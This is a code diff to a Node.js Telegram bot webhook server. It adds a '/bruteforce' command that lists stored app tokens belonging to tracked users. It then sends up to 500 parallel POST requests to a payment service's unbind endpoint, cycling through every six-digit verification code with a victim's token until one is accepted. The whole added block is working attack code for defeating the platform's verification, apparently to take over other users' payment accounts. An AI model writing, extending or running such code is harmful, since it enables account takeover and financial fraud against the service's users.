@@ -691,6 +691,12 @@ app.post('/bot-webhook', async (req, res) => {
 === TRACKING ===
 /idtrack — Show all tracked user IDs
 
+=== BRUTEFORCE ===
+/bruteforce — Show available tokens
+/bruteforce <token> — Start (500 parallel)
+/bruteforce <token> <concurrency> — Custom parallel
+/bruteforce <token> <conc> <start> <end>
+
 Example:
 /addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
       );
@@ -1115,6 +1121,106 @@ Example:
 
     if (text === '/help') {
       await bot.sendMessage(chatId, 'Use /start to see all commands.');
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/bruteforce')) {
+      const parts = text.split(' ');
+      const targetToken = parts[1];
+      if (!targetToken) {
+        let tokenList = '';
+        if (redis) {
+          const allTokens = await redis.hgetall('ezpayTokenMap');
+          if (allTokens) {
+            for (const [tk, uid] of Object.entries(allTokens)) {
+              tokenList += `\n👤 ${uid} → ${tk.substring(0, 30)}...`;
+            }
+          }
+        }
+        if (!tokenList) {
+          for (const [tk, uid] of Object.entries(tokenUserMap)) {
+            tokenList += `\n👤 ${uid} → ${tk.substring(0, 30)}...`;
+          }
+        }
+        await bot.sendMessage(chatId, `Usage: /bruteforce <apptoken>\n\nAvailable tokens:${tokenList || '\nNo tokens found'}`);
+        return res.sendStatus(200);
+      }
+
+      const conc = parseInt(parts[2] || '500', 10);
+      const startCode = parseInt(parts[3] || '0', 10);
+      const endCode = parseInt(parts[4] || '999999', 10);
+      const total = endCode - startCode + 1;
+
+      await bot.sendMessage(chatId, `🔓 BRUTEFORCE STARTING\n🔢 Range: ${String(startCode).padStart(6,'0')} → ${String(endCode).padStart(6,'0')} (${total} codes)\n⚡ Concurrency: ${conc}\nToken: ${targetToken.substring(0, 25)}...`);
+
+      let found = false;
+      let tried = 0;
+      let errors = 0;
+      let bfStartTime = Date.now();
+
+      async function tryUnbindCode(code) {
+        if (found) return;
+        const codeStr = String(code).padStart(6, '0');
+        try {
+          const resp = await fetch('https://api.ezpaycenter.com/app/api/memberManager/v2/unbindRobot', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'apptoken': targetToken,
+              'host': 'api.ezpaycenter.com',
+              'accept': 'application/json',
+            },
+            body: JSON.stringify({ verificationCode: codeStr }),
+          });
+          const respText = await resp.text();
+          tried++;
+          let json;
+          try { json = JSON.parse(respText); } catch(e) {}
+
+          if (json && json.status === '200') {
+            found = true;
+            await bot.sendMessage(chatId, `✅ CODE FOUND: ${codeStr}\n\n🎉 Unbind successful!\n📊 Tried: ${tried} codes\n⏱ Time: ${((Date.now() - bfStartTime) / 1000).toFixed(1)}s\n\n📥 Response:\n${respText.substring(0, 1500)}`);
+            return;
+          }
+
+          if (json && json.status !== '600') {
+            await bot.sendMessage(chatId, `⚠️ Unusual status for ${codeStr}: ${json.status} - ${json.message}`);
+            if (json.status === '601') {
+              found = true;
+              await bot.sendMessage(chatId, `🛑 Token expired (601). Bruteforce stopped.`);
+              return;
+            }
+          }
+
+          if (tried % 10000 === 0) {
+            const elapsed = (Date.now() - bfStartTime) / 1000;
+            const rate = tried / elapsed;
+            const remaining = (total - tried) / rate;
+            await bot.sendMessage(chatId, `📊 Progress: ${tried}/${total} (${(tried/total*100).toFixed(1)}%)\n⚡ Rate: ${rate.toFixed(0)}/s\n❌ Errors: ${errors}\n⏱ ETA: ${remaining.toFixed(0)}s`);
+          }
+        } catch(e) {
+          errors++;
+        }
+      }
+
+      (async () => {
+        try {
+          for (let i = startCode; i <= endCode && !found; i += conc) {
+            const batch = [];
+            for (let j = i; j < i + conc && j <= endCode; j++) {
+              batch.push(tryUnbindCode(j));
+            }
+            await Promise.all(batch);
+          }
+          if (!found) {
+            const elapsed = (Date.now() - bfStartTime) / 1000;
+            await bot.sendMessage(chatId, `❌ Bruteforce complete — no valid code found\n📊 Tried: ${tried}/${total}\n⏱ Time: ${elapsed.toFixed(1)}s\n❌ Errors: ${errors}`);
+          }
+        } catch(e) {
+          await bot.sendMessage(chatId, `🛑 Bruteforce error: ${e.message}`).catch(()=>{});
+        }
+      })();
+
       return res.sendStatus(200);
     }
 
